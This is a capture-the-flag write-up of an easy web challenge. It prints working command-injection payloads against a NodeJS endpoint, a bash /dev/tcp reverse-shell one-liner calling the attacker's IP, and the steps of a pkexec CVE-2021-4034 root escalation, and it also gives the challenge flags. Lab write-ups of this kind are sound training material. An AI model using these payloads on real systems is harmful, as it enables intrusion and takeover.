[[Easy]]  |  [[Web Challenge]]

The challenge starts us with a web application where we are to find an access token, get a user login, then successfully escalate our privileges to get the final flag.

Going to the page it's a static image with the tab header saying "Not allowed". If we request the site instead from BurpSuite, it's just an initial GET request with not much to modify. 

Before I went any deeper, I ran an nmap scan and a fuzz on the site to find any subdirectories or open ports that may be our initial foothold
`ffuf -u http://10.113.131.137/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,.bak,.old,.log,.conf,.pem,.key`
`sudo nmap -sT -A 10.113.131.137 -vv`

While those are running, I looked into the page code and noticed the getAccess function fetching information from /api/access. When traversing to that directory, it revealed `{"token":"dGhpc19pc19ub3RfcmVhbA=="}`. Trying to put in this token into our GET requests on the site doesn't result in much. 

If we look at the token closely though, it resembles a base64 encoded string. When we input this string into an online decoder, it returns `this_is_not_real`, which happens to be our first flag, which also means we're on the right track. 

If we pass this new token into our original GET request: `Cookie: token=this_is_not_real`; we will be presented with a new, updated site. 

On this site, there are tabs such as 'all', 'sins', 'errors', and 'deaths', but all of these are client-side javascript, so they will not help us compromise the server. If we refresh the site again though with burp interceptor turned on, we will notice that it makes a call to /api/items. 

Going to this site gives us a json response of the elements shown on the previous page. Now our THM hint asks us what other methods the API accepts. If we try doing a POST request to /# or the home page, we will have no luck, however, if we instead do a test POST request to /api/items, we get a different response:
`{"message":"there_is_a_glitch_in_the_matrix"} `


If we fuzz this new `/api/items` directory, we will come up with a further subdirectory `/cmd` that gives us a 500 error. If we try to post a test command to that endpoint like the below command, we will get an error:
`curl -X POST http://10.114.190.170/api/items\?cmd\=whoami`
Our error says the command is not defined and reveals it's a NodeJS app.

With this information, we can modify our command to the following, and successfully find out the user is "user".
`curl -X POST "http://10.114.150.62/api/items?cmd=require('child_process').execSync('whoami').toString()"`

Now that we can run commands, we can get a reverse shell with netcat going. This particular command listens, only accepts numeric IP addresses, is verbose, and uses port 6969. 
`sudo nc -lnvp 6969`

Since the remote server is using a different kind of Netcat, we can't go the basic route, so we instead need to use a bash TCP shell with the spaces encoded. 
`curl -X POST "http://10.114.150.62/api/items?cmd=require('child_process').execSync('bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.164.173/6969%200%3E%261%22')"

Now that we've got our shell going, we can run `cat /home/user/user.txt` to find the 3rd flag - THM{i_don't_know_why}

Finally, we need to get privilege escalation. If we run the command `find / -perm -4000 2>/dev/null` we can search for SUID binaries that could allow for privesc. On this server, they are running an old version of pkexec, which is what we need to get our root shell. 

In order to exploit this, I used the Github PoC located at https://github.com/mebeim/CVE-2021-4034. 

By hosting these files on my Kali machine (`python3 -m http.server 8000`), I was able to download them into the users home directory and run the shell script after making it executable, giving us our shell.

Finally, our flag is located in /root/root.txt: THM{diamonds_break_our_aching_minds}


### Bonus:
Remember those fuzzing and nmap scans we ran at the start but I never brought up again?
The nmap didn't come up with much, but the fuzzing came up with a little easter egg: /secret. If we use our cookie we found at the start with /secret, we find a hidden (and unhelpful) webpage with a bunch of rabbits saying "Mad".



### Improvements
I had a lot of fun with this challenge, at least up until the /api/items point. I had run fuzzing tools on every single previous endpoint and it did not end up being useful, and /api/items allowed POST requests, so I kept getting stuck on how I should format it properly. I never thought to run the fuzzing tool again there since it didn't help at all previously. I never would have found it without checking the writeups. 

Additionally, after this point I started relying a lot heavier on AI for many parts, especially the initial reverse shell, but I learned a lot in the process. 